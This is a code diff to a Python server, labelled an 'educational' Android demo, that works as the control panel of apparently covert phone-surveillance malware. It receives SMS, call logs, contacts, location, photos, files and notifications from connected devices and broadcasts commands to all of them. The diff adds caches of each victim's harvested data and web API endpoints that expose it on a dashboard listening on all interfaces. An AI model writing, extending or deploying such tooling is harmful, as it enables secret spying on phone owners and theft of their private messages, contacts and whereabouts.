@@ -56,6 +56,15 @@ class DeviceSession:
         self.bytes_received = 0
         self.bytes_sent = 0
         self.notifications_buffer = []
+        self.last_gallery_list = None
+        self.last_file_list = None
+        self.last_call_logs = None
+        self.last_contacts = None
+        self.last_sms_logs = None
+        self.last_app_list = None
+        self.last_storage_info = None
+        self.last_location = None
+        self.last_device_info = None
 
 
 class DemoServer:
@@ -519,7 +528,7 @@ class DemoServer:
                                     save_dir = VIDEO_DIR
                                 else:
                                     save_dir = DOCS_DIR
-                                
+
                                 filename = pending["filename"]
                                 filepath = os.path.join(save_dir, filename)
 
@@ -546,7 +555,7 @@ class DemoServer:
                                 session.client_socket.send(ack)
                                 session.device_info.pop("pending_file", None)
                         else:
-                            # We are expecting JSON — try to decode one message
+                            # We are expecting JSON - try to decode one message
                             try:
                                 chunk_str = combined[idx:].decode('utf-8')
                                 decoder = json.JSONDecoder()
@@ -559,11 +568,11 @@ class DemoServer:
                                 json_bytes_len = len(chunk_str[:end_pos].encode('utf-8'))
                                 idx += json_bytes_len
                             except json.JSONDecodeError:
-                                # Incomplete JSON — save remainder, wait for more data
+                                # Incomplete JSON - save remainder, wait for more data
                                 remainder = combined[idx:]
                                 idx = len(combined)
                             except UnicodeDecodeError:
-                                # Binary data where we expected JSON — this means
+                                # Binary data where we expected JSON - this means
                                 # a file_transfer_start was received but pending_file
                                 # wasn't set (race or missed). Treat remaining bytes
                                 # as raw and re-process on next recv.
@@ -612,6 +621,7 @@ class DemoServer:
             lat = message.get("latitude", "Unknown")
             lon = message.get("longitude", "Unknown")
             acc = message.get("accuracy", "Unknown")
+            session.last_location = message
             self.log(f"[i] Location from session {session.session_id}:")
             self.log(f"    Latitude: {lat}")
             self.log(f"    Longitude: {lon}")
@@ -620,6 +630,7 @@ class DemoServer:
 
         elif msg_type == "gallery_list":
             files = message.get("files", [])
+            session.last_gallery_list = files
             self.log(f"[i] Gallery file list from session {session.session_id} ({len(files)} items):")
             for f in files[:20]:
                 if isinstance(f, dict):
@@ -636,13 +647,15 @@ class DemoServer:
             self.log_to_file(message, session.address)
 
         elif msg_type == "file_list_legacy":
-            # Legacy format: simple string array
+            # Legacy format: simple string array (old get_file_list command)
             files = message.get("files", [])
+            session.last_gallery_list = files
             self.log(f"[i] Gallery file list (legacy) from session {session.session_id} ({len(files)} files):")
             for f in files[:20]:
                 self.log(f"    - {f}")
             if len(files) > 20:
                 self.log(f"    ... and {len(files) - 20} more")
+            session.last_device_info = message
             self.log_to_file(message, session.address)
 
         elif msg_type == "app_list":
@@ -652,6 +665,7 @@ class DemoServer:
                 self.log(f"    - {app}")
             if len(apps) > 15:
                 self.log(f"    ... and {len(apps) - 15} more")
+            session.last_app_list = apps
             self.log_to_file(message, session.address)
 
         elif msg_type == "file_transfer_start":
@@ -720,6 +734,7 @@ class DemoServer:
             with open(calllog_file, 'w') as f:
                 json.dump(calls, f, indent=2)
             self.log(f"    [+] Saved to: {calllog_file}")
+            session.last_call_logs = calls
             self.log_to_file(message, session.address)
 
         elif msg_type == "contacts":
@@ -738,6 +753,7 @@ class DemoServer:
             with open(contacts_file, 'w') as f:
                 json.dump(contacts, f, indent=2)
             self.log(f"    [+] Saved to: {contacts_file}")
+            session.last_contacts = contacts
             self.log_to_file(message, session.address)
 
         elif msg_type == "sms_logs":
@@ -757,6 +773,7 @@ class DemoServer:
             with open(sms_file, 'w') as f:
                 json.dump(sms_list, f, indent=2)
             self.log(f"    [+] Saved to: {sms_file}")
+            session.last_sms_logs = sms_list
             self.log_to_file(message, session.address)
 
         elif msg_type == "file_list":
@@ -777,6 +794,7 @@ class DemoServer:
             with open(filelist_file, 'w') as f:
                 json.dump(files, f, indent=2)
             self.log(f"    [+] Saved to: {filelist_file}")
+            session.last_file_list = message
             self.log_to_file(message, session.address)
 
         elif msg_type == "storage_info":
@@ -784,6 +802,7 @@ class DemoServer:
             self.log(f"    Total: {message.get('total_gb', '?')} GB")
             self.log(f"    Free:  {message.get('free_gb', '?')} GB")
             self.log(f"    Used:  {message.get('used_percent', '?')}%")
+            session.last_storage_info = message
             self.log_to_file(message, session.address)
 
         elif msg_type == "notification":
@@ -818,17 +837,17 @@ class DemoServer:
 
 class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
     """Handle HTTP requests for the web GUI."""
-    
+
     server_instance = None
-    
+
     def log_message(self, format, *args):
         pass
-    
+
     def do_GET(self):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
         query = urllib.parse.parse_qs(parsed.query)
-        
+
         if path == '/' or path == '/index.html':
             self.serve_file('index.html', 'text/html')
         elif path == '/style.css':
@@ -843,13 +862,37 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             self.handle_get_stats()
         elif path == '/api/command':
             self.handle_get_command(query)
+        elif path == '/api/gallery':
+            self.handle_get_gallery(query)
+        elif path == '/api/filebrowser':
+            self.handle_get_filebrowser(query)
+        elif path == '/api/data':
+            self.handle_get_data(query)
+        elif path == '/api/received-files':
+            self.handle_list_received_files(query)
+        elif path == '/api/download-file':
+            self.handle_download_received_file(query)
+        elif path == '/api/call-logs':
+            self.handle_get_call_logs(query)
+        elif path == '/api/contacts':
+            self.handle_get_contacts(query)
+        elif path == '/api/sms-logs':
+            self.handle_get_sms_logs(query)
+        elif path == '/api/app-list':
+            self.handle_get_app_list(query)
+        elif path == '/api/location':
+            self.handle_get_location(query)
+        elif path == '/api/storage':
+            self.handle_get_storage(query)
+        elif path == '/api/device-info':
+            self.handle_get_device_info_data(query)
         else:
             self.send_error(404, "Not Found")
-    
+
     def do_POST(self):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
-        
+
         if path == '/api/command':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length)
@@ -860,7 +903,7 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
                 self.send_error(400, "Bad Request")
         else:
             self.send_error(404, "Not Found")
-    
+
     def serve_file(self, filename, content_type):
         try:
             with open(filename, 'rb') as f:
@@ -874,7 +917,7 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_error(404, "File Not Found")
         except Exception as e:
             self.send_error(500, "Internal Server Error")
-    
+
     def handle_get_devices(self):
         if not self.server_instance:
             self.send_error(500, "Server not available")
@@ -892,21 +935,21 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
                     'notifications': session.total_notifications_received
                 })
         self.send_json_response(devices)
-    
+
     def handle_get_logs(self):
         if not self.server_instance:
             self.send_error(500, "Server not available")
             return
         logs = getattr(self.server_instance, 'recent_logs', [])
         self.send_json_response({'logs': logs})
-    
+
     def handle_get_stats(self):
         if not self.server_instance:
             self.send_error(500, "Server not available")
             return
         self.server_instance.update_stats()
         self.send_json_response(self.server_instance.stats)
-    
+
     def handle_get_command(self, query):
         if not self.server_instance:
             self.send_error(500, "Server not available")
@@ -915,7 +958,7 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
         args = query.get('args', ['{}'])[0]
         self.server_instance.send_command_to_all(command, args)
         self.send_json_response({'status': 'sent', 'command': command})
-    
+
     def handle_post_command(self, data):
         if not self.server_instance:
             self.send_error(500, "Server not available")
@@ -926,7 +969,173 @@ class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
             args = json.dumps(args)
         self.server_instance.send_command_to_all(command, args)
         self.send_json_response({'status': 'sent', 'command': command})
-    
+
+    def handle_get_gallery(self, query):
+        """Return last gallery list from a device."""
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            if session and session.last_gallery_list is not None:
+                self.send_json_response({'gallery': session.last_gallery_list, 'session': sid})
+            else:
+                self.send_json_response({'gallery': [], 'session': sid, 'error': 'No gallery data yet'})
+
+    def handle_get_filebrowser(self, query):
+        """Return last file browser results from a device."""
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            if session and session.last_file_list is not None:
+                self.send_json_response({'files': session.last_file_list, 'session': sid})
+            else:
+                self.send_json_response({'files': [], 'session': sid, 'error': 'No file browser data yet'})
+
+    def handle_get_data(self, query):
+        """Return last data response (contacts, call logs, sms, etc.) from a device."""
+        if not self.server_instance:
+            self.send_error(500, "Server not available")
+            return
+        sid = query.get('session', ['1'])[0]
+        dtype = query.get('type', ['all'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            if not session:
+                self.send_json_response({'error': 'Session not found'})
+                return
+            result = {}
+            if dtype in ['all', 'call_logs']:
+                result['call_logs'] = session.last_call_logs or []
+            if dtype in ['all', 'contacts']:
+                result['contacts'] = session.last_contacts or []
+            if dtype in ['all', 'sms_logs']:
+                result['sms_logs'] = session.last_sms_logs or []
+            if dtype in ['all', 'app_list']:
+                result['app_list'] = session.last_app_list or []
+            if dtype in ['all', 'location']:
+                result['location'] = session.last_location or {}
+            if dtype in ['all', 'storage']:
+                result['storage'] = session.last_storage_info or {}
+            if dtype in ['all', 'device_info']:
+                result['device_info'] = session.last_device_info or {}
+            result['session'] = sid
+            self.send_json_response(result)
+
+    def handle_list_received_files(self, query):
+        """List files in received_files directory."""
+        subdir = query.get('dir', [''])[0]
+        base_dir = os.path.abspath(RECEIVED_DIR)
+        if subdir:
+            target_dir = os.path.normpath(os.path.join(base_dir, subdir))
+            # Security: prevent path traversal
+            if not target_dir.startswith(base_dir):
+                self.send_error(403, "Forbidden")
+                return
+        else:
+            target_dir = base_dir
+
+        files_list = []
+        if os.path.isdir(target_dir):
+            for entry in os.listdir(target_dir):
+                entry_path = os.path.join(target_dir, entry)
+                rel_path = os.path.relpath(entry_path, base_dir).replace(os.sep, '/')
+                is_dir = os.path.isdir(entry_path)
+                files_list.append({
+                    'name': entry,
+                    'path': rel_path,
+                    'is_dir': is_dir,
+                    'size': os.path.getsize(entry_path) if not is_dir else 0
+                })
+
+        files_list.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
+        self.send_json_response({'files': files_list, 'current_dir': subdir})
+
+    def handle_download_received_file(self, query):
+        """Download a file from received_files directory."""
+        filepath = query.get('path', [''])[0]
+        if not filepath:
+            self.send_error(400, "Missing 'path' parameter")
+            return
+        base_dir = os.path.abspath(RECEIVED_DIR)
+        full_path = os.path.normpath(os.path.join(base_dir, filepath))
+        if not full_path.startswith(base_dir):
+            self.send_error(403, "Forbidden")
+            return
+        if not os.path.isfile(full_path):
+            self.send_error(404, "File not found")
+            return
+
+        # Determine content type
+        ext = os.path.splitext(full_path)[1].lower()
+        content_types = {
+            '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png',
+            '.gif': 'image/gif', '.webp': 'image/webp', '.bmp': 'image/bmp',
+            '.mp4': 'video/mp4', '.3gp': 'video/3gpp', '.avi': 'video/x-msvideo',
+            '.mp3': 'audio/mpeg', '.wav': 'audio/wav', '.ogg': 'audio/ogg',
+            '.txt': 'text/plain', '.json': 'application/json', '.log': 'text/plain',
+            '.pdf': 'application/pdf'
+        }
+        ct = content_types.get(ext, 'application/octet-stream')
+
+        try:
+            with open(full_path, 'rb') as f:
+                content = f.read()
+            self.send_response(200)
+            self.send_header('Content-Type', ct)
+            self.send_header('Content-Length', str(len(content)))
+            self.send_header('Content-Disposition', f'inline; filename="{os.path.basename(full_path)}"')
+            self.end_headers()
+            self.wfile.write(content)
+        except Exception as e:
+            self.send_error(500, f"Error reading file: {e}")
+
+    def handle_get_call_logs(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'call_logs': session.last_call_logs} if session else {'call_logs': []})
+
+    def handle_get_contacts(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'contacts': session.last_contacts} if session else {'contacts': []})
+
+    def handle_get_sms_logs(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'sms_logs': session.last_sms_logs} if session else {'sms_logs': []})
+
+    def handle_get_app_list(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'apps': session.last_app_list} if session else {'apps': []})
+
+    def handle_get_location(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'location': session.last_location} if session else {'location': {}})
+
+    def handle_get_storage(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'storage': session.last_storage_info} if session else {'storage': {}})
+
+    def handle_get_device_info_data(self, query):
+        sid = query.get('session', ['1'])[0]
+        with self.server_instance.lock:
+            session = self.server_instance.sessions.get(int(sid))
+            self.send_json_response({'device_info': session.last_device_info} if session else {'device_info': {}})
+
     def send_json_response(self, data):
         response = json.dumps(data)
         self.send_response(200)
@@ -946,26 +1155,26 @@ def main():
     SOCKET_PORT = 8000
     HTTP_HOST = '0.0.0.0'
     HTTP_PORT = 8080
-    
+
     log_queue = queue.Queue()
-    
+
     socket_server = DemoServer(
         host=SOCKET_HOST,
         port=SOCKET_PORT,
         log_queue=log_queue,
         console_mode=False
     )
-    
+
     ThreadedHTTPRequestHandler.server_instance = socket_server
-    
+
     http_server = ThreadedHTTPServer((HTTP_HOST, HTTP_PORT), ThreadedHTTPRequestHandler)
-    
+
     socket_thread = threading.Thread(target=socket_server.start, daemon=True)
     socket_thread.start()
-    
+
     http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
     http_thread.start()
-    
+
     print("=" * 60)
     print("  ANDROID DEVICE DEMO SERVER - VERSION 5.1 WITH WEB GUI")
     print("  Educational Purpose Only")
@@ -974,7 +1183,7 @@ def main():
     print(f"[+] HTTP server listening on {HTTP_HOST}:{HTTP_PORT}")
     print(f"[+] Open http://<server-ip>:{HTTP_PORT} in a browser to access the GUI")
     print("=" * 60)
-    
+
     try:
         while True:
             time.sleep(1)
